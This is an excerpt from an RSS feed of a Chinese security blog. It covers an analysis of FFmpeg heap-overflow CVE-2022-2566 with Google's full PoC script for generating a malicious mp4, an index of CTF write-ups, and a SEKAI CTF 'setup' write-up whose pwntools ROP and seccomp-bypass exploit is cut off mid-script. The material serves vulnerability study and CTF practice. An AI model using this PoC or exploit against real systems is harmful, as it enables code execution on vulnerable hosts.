    <description><![CDATA[<h1 id="marks-blog">Mark’s blog</h1>
<blockquote>
<p>Live long and Pwn</p>
</blockquote>
<p>Pwn learner 的互联网自留地</p>
<h2 id="cve-复现分析">CVE 复现&amp;分析</h2>
<ul>
<li><strong>[22/09/29]</strong> <a href="/220929-CVE_2016_5195">CVE-2016-5195</a></li>
<li><strong>[22/10/20]</strong> <a href="/221020-CVE_2022_2566">CVE-2022-2566</a></li>
</ul>]]></description>
    <pubDate>Thu, 20 Oct 2022 16:11:27 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[CVE-2022-2566 分析和复现]]></title>
    <link>https://blog.mark0519.com/#//#/221020-CVE_2022_2566</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/221020-CVE_2022_2566</guid>
    <description><![CDATA[<h1 id="cve-2022-2566-分析和复现">CVE-2022-2566 分析和复现</h1>
<blockquote>
<p>FFmpeg v5.1 堆越界内存写入</p>
</blockquote>
<h2 id="x00-背景">0x00 背景</h2>
<p><code>FFmpeg</code> https://www.ffmpeg.org/</p>
<p>它视频处理最常用的开源软件。它功能强大，用途广泛，大量用于视频网站和商业软件（比如 Youtube 和 iTunes），也是许多音频和视频格式的标准编码/解码实现。</p>
<p>在 <code>libavformat/mov.c</code>中发现了影响 FFmpeg 自 5.1 版或提交 ab77b878f1205225c6de1370fb0e998dbcc8bc69 的堆越界写入。</p>
<p>Google的分析：<a href="https://github.com/google/security-research/security/advisories/GHSA-vhxg-9wfx-7fcj">FFmpeg: Heap Out-Of-Bounds Write in build_open_gop_key_points · Advisory · google/security-research (github.com)</a></p>
<p>该漏洞被定位是高危漏洞（<em>High</em>），攻击者可以通过恶意 mp4 文件导致远程代码执行（RCE）。</p>
<h2 id="x01-漏洞分析">0x01 漏洞分析</h2>
<p>根据CVE描述，可以知道漏洞在 ab77b878f1205225c6de1370fb0e998dbcc8bc69 提交中引入。</p>
<p>而对应的修复commit为：6f53f0d09ea4c9c7f7354f018a87ef840315207d。</p>
<p>对应的修复：</p>
<p><a href="https://github.com/FFmpeg/FFmpeg/commit/6f53f0d09ea4c9c7f7354f018a87ef840315207d">avformat/mov: Check count sums in build_open_gop_key_points() · FFmpeg/FFmpeg@6f53f0d (github.com)</a></p>
<figure>
<img src="https://pic1.imgdb.cn/item/634fc0f416f2c2beb16005d9.png" alt="fix" /><figcaption>fix</figcaption>
</figure>
<p>可以看到关键代码为：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb1-2" title="2">        sc-&gt;sample_offsets_count += sc-&gt;ctts_data[i].count;</a></code></pre></div>
<p>而变量<code>sc-&gt;sample_offsets_count</code>被定义为<code>int</code></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1"><span class="dt">int</span> sample_offsets_count;</a></code></pre></div>
<p>所以<code>sc-&gt;sample_offsets_count</code>为8字节数，如果最大值超过<code>INT_MAX</code>则会发生整数溢出。</p>
<p>这个整数溢出会影响接下来malloc的申请：</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1">sc-&gt;sample_offsets = av_calloc(sc-&gt;sample_offsets_count, <span class="kw">sizeof</span>(*sc-&gt;sample_offsets));</a></code></pre></div>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"><span class="dt">void</span> *av_calloc(<span class="dt">size_t</span> nmemb, <span class="dt">size_t</span> size) av_malloc_attrib av_alloc_size(<span class="dv">1</span>, <span class="dv">2</span>);</a></code></pre></div>
<p><img src="https://pic1.imgdb.cn/item/634ff67a16f2c2beb1bd971d.png" /></p>
<p>如果出现整数溢出导致<code>sc-&gt;sample_offsets_count == 0</code>就会导致<code>av_calloc</code>申请最小的chunk</p>
<p>也就是<code>sc-&gt;sample_offsets</code>会指向一个0x20的chunk</p>
<p>之后会把每个ctts的duration写入这个chunk中：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb5-2" title="2">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</a>
<a class="sourceLine" id="cb5-3" title="3">             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</a></code></pre></div>
<p>如果<code>sc-&gt;ctts_data[i].duration</code>过长，就会产生堆溢出。</p>
<h2 id="x02-poc调试">0x02 POC调试</h2>
<p>这里给出Google安全研究员提供的POC</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" title="1"><span class="co">#!/usr/bin/env python3</span></a>
<a class="sourceLine" id="cb6-2" title="2"><span class="im">import</span> struct</a>
<a class="sourceLine" id="cb6-3" title="3"><span class="im">import</span> sys</a>
<a class="sourceLine" id="cb6-4" title="4"></a>
<a class="sourceLine" id="cb6-5" title="5">HEVC_NAL_CRA_NUT <span class="op">=</span> <span class="dv">21</span></a>
<a class="sourceLine" id="cb6-6" title="6"></a>
<a class="sourceLine" id="cb6-7" title="7"></a>
<a class="sourceLine" id="cb6-8" title="8"><span class="kw">def</span> atom(tag, chunk):</a>
<a class="sourceLine" id="cb6-9" title="9">  data <span class="op">=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bu">len</span>(chunk) <span class="op">+</span> <span class="dv">8</span>)</a>
<a class="sourceLine" id="cb6-10" title="10">  data <span class="op">+=</span> tag</a>
<a class="sourceLine" id="cb6-11" title="11">  data <span class="op">+=</span> chunk</a>
<a class="sourceLine" id="cb6-12" title="12">  <span class="cf">return</span> data</a>
<a class="sourceLine" id="cb6-13" title="13"></a>
<a class="sourceLine" id="cb6-14" title="14"></a>
<a class="sourceLine" id="cb6-15" title="15"><span class="kw">def</span> atom_ftyp():</a>
<a class="sourceLine" id="cb6-16" title="16">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-17" title="17">  data <span class="op">+=</span> b<span class="st">&#39;mp42&#39;</span>  <span class="co"># type</span></a>
<a class="sourceLine" id="cb6-18" title="18">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;L&#39;</span>, <span class="dv">0</span>)  <span class="co"># minor_ver</span></a>
<a class="sourceLine" id="cb6-19" title="19">  <span class="cf">return</span> atom(b<span class="st">&#39;ftyp&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-20" title="20"></a>
<a class="sourceLine" id="cb6-21" title="21"></a>
<a class="sourceLine" id="cb6-22" title="22"><span class="kw">def</span> atom_moov(nested):</a>
<a class="sourceLine" id="cb6-23" title="23">  <span class="cf">return</span> atom(b<span class="st">&#39;moov&#39;</span>, nested)</a>
<a class="sourceLine" id="cb6-24" title="24"></a>
<a class="sourceLine" id="cb6-25" title="25"></a>
<a class="sourceLine" id="cb6-26" title="26"><span class="kw">def</span> atom_trak(nested):</a>
<a class="sourceLine" id="cb6-27" title="27">  <span class="cf">return</span> atom(b<span class="st">&#39;trak&#39;</span>, nested)</a>
<a class="sourceLine" id="cb6-28" title="28"></a>
<a class="sourceLine" id="cb6-29" title="29"></a>
<a class="sourceLine" id="cb6-30" title="30"><span class="kw">def</span> atom_hev1():</a>
<a class="sourceLine" id="cb6-31" title="31">  <span class="cf">return</span> atom(b<span class="st">&#39;hev1&#39;</span>, b<span class="st">&#39;&#39;</span>)</a>
<a class="sourceLine" id="cb6-32" title="32"></a>
<a class="sourceLine" id="cb6-33" title="33"></a>
<a class="sourceLine" id="cb6-34" title="34"><span class="kw">def</span> atom_stsd(nested):</a>
<a class="sourceLine" id="cb6-35" title="35">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-36" title="36">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-37" title="37">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-38" title="38">  data <span class="op">+=</span> nested</a>
<a class="sourceLine" id="cb6-39" title="39">  data <span class="op">+=</span> b<span class="st">&#39;</span><span class="ch">\0</span><span class="st">&#39;</span> <span class="op">*</span> <span class="dv">70</span></a>
<a class="sourceLine" id="cb6-40" title="40">  <span class="cf">return</span> atom(b<span class="st">&#39;stsd&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-41" title="41"></a>
<a class="sourceLine" id="cb6-42" title="42"></a>
<a class="sourceLine" id="cb6-43" title="43"><span class="kw">def</span> atom_sgpd():</a>
<a class="sourceLine" id="cb6-44" title="44">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-45" title="45">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-46" title="46">  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></a>
<a class="sourceLine" id="cb6-47" title="47">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># default_length</span></a>
<a class="sourceLine" id="cb6-48" title="48">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># entry_count</span></a>
<a class="sourceLine" id="cb6-49" title="49">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-50" title="50">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;B&#39;</span>, HEVC_NAL_CRA_NUT)  <span class="co"># nal_unit_type</span></a>
<a class="sourceLine" id="cb6-51" title="51">  <span class="cf">return</span> atom(b<span class="st">&#39;sgpd&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-52" title="52"></a>
<a class="sourceLine" id="cb6-53" title="53"></a>
<a class="sourceLine" id="cb6-54" title="54"><span class="kw">def</span> atom_sbgp():</a>
<a class="sourceLine" id="cb6-55" title="55">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-56" title="56">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-57" title="57">  data <span class="op">+=</span> b<span class="st">&#39;sync&#39;</span>  <span class="co"># grouping_type</span></a>
<a class="sourceLine" id="cb6-58" title="58">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">2</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-59" title="59">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-60" title="60">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># sample_count</span></a>
<a class="sourceLine" id="cb6-61" title="61">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></a>
<a class="sourceLine" id="cb6-62" title="62">  <span class="co"># entry 1</span></a>
<a class="sourceLine" id="cb6-63" title="63">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0xffffffff</span>)  <span class="co"># sample_count</span></a>
<a class="sourceLine" id="cb6-64" title="64">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">1</span>)  <span class="co"># group_description_index</span></a>
<a class="sourceLine" id="cb6-65" title="65">  <span class="cf">return</span> atom(b<span class="st">&#39;sbgp&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-66" title="66"></a>
<a class="sourceLine" id="cb6-67" title="67"></a>
<a class="sourceLine" id="cb6-68" title="68"><span class="kw">def</span> atom_ctts():</a>
<a class="sourceLine" id="cb6-69" title="69">  data <span class="op">=</span> b<span class="st">&#39;&#39;</span></a>
<a class="sourceLine" id="cb6-70" title="70">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&lt;I&#39;</span>, <span class="dv">0</span>)  <span class="co"># version &amp; flags</span></a>
<a class="sourceLine" id="cb6-71" title="71">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="dv">4</span>)  <span class="co"># entries</span></a>
<a class="sourceLine" id="cb6-72" title="72">  <span class="co"># entry 0</span></a>
<a class="sourceLine" id="cb6-73" title="73">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-74" title="74">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-75" title="75">  <span class="co"># entry 1</span></a>
<a class="sourceLine" id="cb6-76" title="76">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-77" title="77">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-78" title="78">  <span class="co"># entry 2</span></a>
<a class="sourceLine" id="cb6-79" title="79">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-80" title="80">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-81" title="81">  <span class="co"># entry 3</span></a>
<a class="sourceLine" id="cb6-82" title="82">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb6-83" title="83">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a>
<a class="sourceLine" id="cb6-84" title="84">  <span class="cf">return</span> atom(b<span class="st">&#39;ctts&#39;</span>, data)</a>
<a class="sourceLine" id="cb6-85" title="85"></a>
<a class="sourceLine" id="cb6-86" title="86"></a>
<a class="sourceLine" id="cb6-87" title="87"><span class="kw">def</span> main():</a>
<a class="sourceLine" id="cb6-88" title="88">  <span class="cf">if</span> <span class="bu">len</span>(sys.argv) <span class="op">!=</span> <span class="dv">2</span>:</a>
<a class="sourceLine" id="cb6-89" title="89">    <span class="bu">print</span>(<span class="st">&#39;Usage: poc.py out.mp4&#39;</span>)</a>
<a class="sourceLine" id="cb6-90" title="90">    <span class="cf">return</span> <span class="dv">-1</span></a>
<a class="sourceLine" id="cb6-91" title="91"></a>
<a class="sourceLine" id="cb6-92" title="92">  data <span class="op">=</span> atom_ftyp() <span class="op">+</span> atom_moov(</a>
<a class="sourceLine" id="cb6-93" title="93">      atom_trak(</a>
<a class="sourceLine" id="cb6-94" title="94">          atom_stsd(atom_hev1()) <span class="op">+</span> atom_sgpd() <span class="op">+</span> atom_sbgp()</a>
<a class="sourceLine" id="cb6-95" title="95">          <span class="op">+</span> atom_ctts()</a>
<a class="sourceLine" id="cb6-96" title="96">      ))</a>
<a class="sourceLine" id="cb6-97" title="97"></a>
<a class="sourceLine" id="cb6-98" title="98">  <span class="bu">open</span>(sys.argv[<span class="dv">1</span>], <span class="st">&#39;wb&#39;</span>).write(data)</a>
<a class="sourceLine" id="cb6-99" title="99"></a>
<a class="sourceLine" id="cb6-100" title="100"></a>
<a class="sourceLine" id="cb6-101" title="101"><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</a>
<a class="sourceLine" id="cb6-102" title="102">  main()</a></code></pre></div>
<p>这里可以看到，生成的这个mp4文件中存在4个<code>ctts</code>结构体，每个的count和duration为：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb7-1" title="1">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x40000000</span>)  <span class="co"># count</span></a>
<a class="sourceLine" id="cb7-2" title="2">  data <span class="op">+=</span> struct.pack(<span class="st">&#39;&gt;I&#39;</span>, <span class="bn">0x00414141</span>)  <span class="co"># duration</span></a></code></pre></div>
<p>也就是会使得<code>sc-&gt;ctts_data[i].count == 0x40000000</code></p>
<p>而我们一共有4个<code>ctts</code>结构，也就是<code>0x40000000*4 = 0x100000000</code></p>
<p>而<code>INT(0x100000000) == 0</code>，所以这个运行这个poc得到的mp4文件就会使得<code>ffmpeg</code>出现整数溢出问题。</p>
<p>我们编译一份存在漏洞版本的<code>ffmpeg</code>，编译之后得到的二进制文件<code>ffmpeg_g</code>就是有GDB调试符号的程序。</p>
<p>在<code>build_open_gop_key_points()</code>函数打断点：</p>
<p><img src="https://pic1.imgdb.cn/item/634ff85516f2c2beb1c0bf1a.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffd0716f2c2beb1c8b975.png" /></p>
<p>可以看到：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd2116f2c2beb1c8e8e0.png" /></p>
<p>之后运行这个for循环：</p>
<p><img src="https://pic1.imgdb.cn/item/634ffd6016f2c2beb1c95a26.png" /></p>
<p>也就是整数溢出使得这个值为0，也就是<code>av_calloc</code>会申请出一个0x20的chunk</p>
<p><img src="https://pic1.imgdb.cn/item/634ffe4116f2c2beb1caf53d.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeac16f2c2beb1cbafe2.png" /></p>
<p><img src="https://pic1.imgdb.cn/item/634ffeb516f2c2beb1cbbf45.png" /></p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb8-1" title="1">    <span class="cf">for</span> (<span class="dt">uint32_t</span> i = <span class="dv">0</span>; i &lt; sc-&gt;ctts_count; i++)</a>
<a class="sourceLine" id="cb8-2" title="2">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; sc-&gt;ctts_data[i].count; j++)</a>
<a class="sourceLine" id="cb8-3" title="3">             sc-&gt;sample_offsets[k++] = sc-&gt;ctts_data[i].duration;</a></code></pre></div>
<p>但是由于<code>sc-&gt;ctts_data[i].count == 0x40000000</code>，所以会直接覆盖接下来的<code>0x40000000*4</code>个字节的堆区，产生堆溢出Heap overflow</p>
<h2 id="x03-利用">0x03 利用</h2>
<blockquote>
<p>暂时没有想到好的利用方法，，，，</p>
</blockquote>]]></description>
    <pubDate>Thu, 20 Oct 2022 16:11:27 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[赛题复现]]></title>
    <link>https://blog.mark0519.com/#//#/reproduce/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/reproduce/README</guid>
    <description><![CDATA[<h1 id="赛题复现">赛题复现</h1>
<blockquote>
<p>青山依旧在，几度夕阳红。</p>
</blockquote>
<h2 id="pwnhub.cn">pwnhub.cn</h2>
<ul>
<li><strong>[22/4/13]</strong> [PWN] <a href="/reproduce/220413-canyouseeme">can_you_see_me</a></li>
</ul>
<h2 id="aaactf2022">AAACTF2022</h2>
<ul>
<li><strong>[22/7/17]</strong> [PWN] <a href="/reproduce/220717-MasterOfDNS">Master of DNS</a></li>
</ul>
<h2 id="space-2022">5Space 2022</h2>
<ul>
<li><strong>[22/9/20]</strong> [PWN] <a href="/reproduce/220920-toolkit">toolkit</a></li>
</ul>
<h2 id="sekai-ctf-2022">SEKAI CTF 2022</h2>
<ul>
<li><strong>[22/10/11]</strong> [PWN] <a href="/reproduce/221011-setup">setup</a></li>
</ul>
<h2 id="其他">其他</h2>
<ul>
<li><p><strong>[22/7/10]</strong> [PWN] <a href="/reproduce/220710-one">one</a></p></li>
<li><p><strong>[22/7/10]</strong> [PWN] <a href="/reproduce/220710-MuteBuild">Mute&amp;Blind</a></p></li>
</ul>]]></description>
    <pubDate>Tue, 11 Oct 2022 16:59:01 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[setup]]></title>
    <link>https://blog.mark0519.com/#//#/reproduce/221011-setup</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/reproduce/221011-setup</guid>
    <description><![CDATA[<h1 id="setup">setup</h1>
<blockquote>
<p>Category: PWN</p>
<p>Date: 2022/10/11</p>
<p>Authorship: SEKAI CTF 2022</p>
</blockquote>
<h2 id="x00-64位下的int-0x80">0x00 64位下的int 0x80</h2>
<p>在64位程序下，使用系统调用的方法是syscall，但是可以直接使用int 0x80来调用32位的系统调用号</p>
<p>比较常见的几个：</p>
<table>
<thead>
<tr class="header">
<th>sys code</th>
<th>x64 (64 bits)</th>
<th>x86 (32 bits)</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0x05</td>
<td>fstat</td>
<td>open</td>
</tr>
<tr class="even">
<td>0xc0</td>
<td>lgetxattr</td>
<td>mmap2</td>
</tr>
<tr class="odd">
<td>0x8d</td>
<td>getpriority</td>
<td>getents</td>
</tr>
</tbody>
</table>
<h2 id="x01-题目分析">0x01 题目分析</h2>
<p><img src="https://pic1.imgdb.cn/item/6345308d16f2c2beb13e47f6.png" /></p>
<p>保护全开的栈溢出，绕过canary的方法为直接修改tls里canary的值</p>
<p>之后rop调用mprotect写修改权限然后sys read写shellcode</p>
<p>之后再写的shellcode里利用int 0x80来绕过seccomp白名单</p>
<blockquote>
<p>需要注意的是，这题flag文件名未知，需要调用getents来获得文件名</p>
</blockquote>
<h2 id="x02-exp">0x02 exp</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb1-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb1-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;./libc-2.34.so&#39;</span>)</a>
<a class="sourceLine" id="cb1-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./setup&quot;</span>)</a>
<a class="sourceLine" id="cb1-7" title="7"></a>
<a class="sourceLine" id="cb1-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb1-9" title="9"></a>
<a class="sourceLine" id="cb1-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./setup&quot;</span>)    </a>
<a class="sourceLine" id="cb1-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb1-14" title="14"></a>
<a class="sourceLine" id="cb1-15" title="15"><span class="kw">def</span> debug(p,cmd<span class="op">=</span><span class="st">&quot;&quot;</span>):</a>
<a class="sourceLine" id="cb1-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-17" title="17">        gdb.attach(p,cmd)</a>
<a class="sourceLine" id="cb1-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb1-20" title="20"></a>
<a class="sourceLine" id="cb1-21" title="21"></a>
<a class="sourceLine" id="cb1-22" title="22">p.sendlineafter(<span class="st">&quot;&gt;&quot;</span>, <span class="st">&quot;1&quot;</span>)</a>
<a class="sourceLine" id="cb1-23" title="23">p.sendlineafter(<span class="st">&quot;to:&quot;</span>, <span class="st">&quot;a&quot;</span><span class="op">*</span><span class="bn">0x18</span>)</a>
<a class="sourceLine" id="cb1-24" title="24">p.sendlineafter(<span class="st">&quot;&gt;&quot;</span>, <span class="st">&quot;1&quot;</span>)</a>
<a class="sourceLine" id="cb1-25" title="25"></a>
<a class="sourceLine" id="cb1-26" title="26">p.recvuntil(<span class="st">&quot;a&quot;</span><span class="op">*</span><span class="bn">0x18</span>)</a>
<a class="sourceLine" id="cb1-27" title="27">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x22aa0a</span></a>
<a class="sourceLine" id="cb1-28" title="28">log.info(<span class="st">&quot;libc_base ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(libc.address))</a>
<a class="sourceLine" id="cb1-29" title="29">tls_canary <span class="op">=</span> libc.address <span class="op">-</span> <span class="bn">0x2898</span></a>
<a class="sourceLine" id="cb1-30" title="30">log.info(<span class="st">&quot;tls_canary ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(tls_canary))</a>
<a class="sourceLine" id="cb1-31" title="31">pop_rax <span class="op">=</span> <span class="bn">0x0000000000049f10</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-32" title="32">pop_rdx <span class="op">=</span> <span class="bn">0x0000000000120272</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-33" title="33">pop_rdi <span class="op">=</span> <span class="bn">0x000000000002e6c5</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-34" title="34">pop_rsi <span class="op">=</span> <span class="bn">0x0000000000030081</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-35" title="35">syscall <span class="op">=</span> <span class="bn">0x0000000000095196</span> <span class="op">+</span> libc.address</a>
<a class="sourceLine" id="cb1-36" title="36"></a>
<a class="sourceLine" id="cb1-37" title="37">payload <span class="op">=</span> flat(</a>
<a class="sourceLine" id="cb1-38" title="38">    tls_canary,</a>
<a class="sourceLine" id="cb1-39" title="39">    <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="bn">0x58</span>,</a>
<a class="sourceLine" id="cb1-40" title="40">    pop_rdi, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-41" title="41">    syscall</a>
<a class="sourceLine" id="cb1-42" title="42">)</a>
<a class="sourceLine" id="cb1-43" title="43"></a>
<a class="sourceLine" id="cb1-44" title="44">p.sendafter(<span class="st">&quot;name:&quot;</span>, payload)</a>
<a class="sourceLine" id="cb1-45" title="45">payload <span class="op">=</span> flat(</a>
<a class="sourceLine" id="cb1-46" title="46">    <span class="st">&#39;A&#39;</span><span class="op">*</span><span class="dv">8</span>,</a>
<a class="sourceLine" id="cb1-47" title="47">    <span class="st">&#39;C&#39;</span><span class="op">*</span><span class="bn">0x21d0</span>,</a>
<a class="sourceLine" id="cb1-48" title="48">)</a>
<a class="sourceLine" id="cb1-49" title="49">payload <span class="op">+=</span> flat(</a>
<a class="sourceLine" id="cb1-50" title="50">    <span class="co"># mprotect</span></a>
<a class="sourceLine" id="cb1-51" title="51">    pop_rax, <span class="bn">0xa</span>,</a>
<a class="sourceLine" id="cb1-52" title="52">    pop_rdi, libc.address <span class="op">+</span> <span class="bn">0x21a000</span>,</a>
<a class="sourceLine" id="cb1-53" title="53">    pop_rsi, <span class="bn">0x1000</span>,</a>
<a class="sourceLine" id="cb1-54" title="54">    pop_rdx, <span class="dv">7</span>,</a>
<a class="sourceLine" id="cb1-55" title="55">    syscall,</a>
<a class="sourceLine" id="cb1-56" title="56"></a>
<a class="sourceLine" id="cb1-57" title="57">    <span class="co"># read(0,libc.address + 0x21a000,0x1000)</span></a>
<a class="sourceLine" id="cb1-58" title="58">    pop_rdi, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-59" title="59">    pop_rsi, libc.address <span class="op">+</span> <span class="bn">0x21a800</span>,</a>
<a class="sourceLine" id="cb1-60" title="60">    pop_rdx, <span class="bn">0x1000</span>,</a>
<a class="sourceLine" id="cb1-61" title="61">    pop_rax, <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb1-62" title="62">    syscall,</a>
<a class="sourceLine" id="cb1-63" title="63"></a>
<a class="sourceLine" id="cb1-64" title="64">    <span class="co"># exec shellcode</span></a>
<a class="sourceLine" id="cb1-65" title="65">    libc.address <span class="op">+</span> <span class="bn">0x21a801</span></a>
<a class="sourceLine" id="cb1-66" title="66">)</a>
<a class="sourceLine" id="cb1-67" title="67"></a>
<a class="sourceLine" id="cb1-68" title="68"></a>
<a class="sourceLine" id="cb1-69" title="69">debug(p,<span class="st">&quot;b *&quot;</span><span class="op">+</span><span class="bu">hex</span>(libc.address <span class="op">+</span> <span class="bn">0x21a800</span>))</a>
<a class="sourceLine" id="cb1-70" title="70"><span class="co"># pause()</span></a>
<a class="sourceLine" id="cb1-71" title="71">p.sendafter(<span class="st">&quot;Data:&quot;</span>, payload)</a>
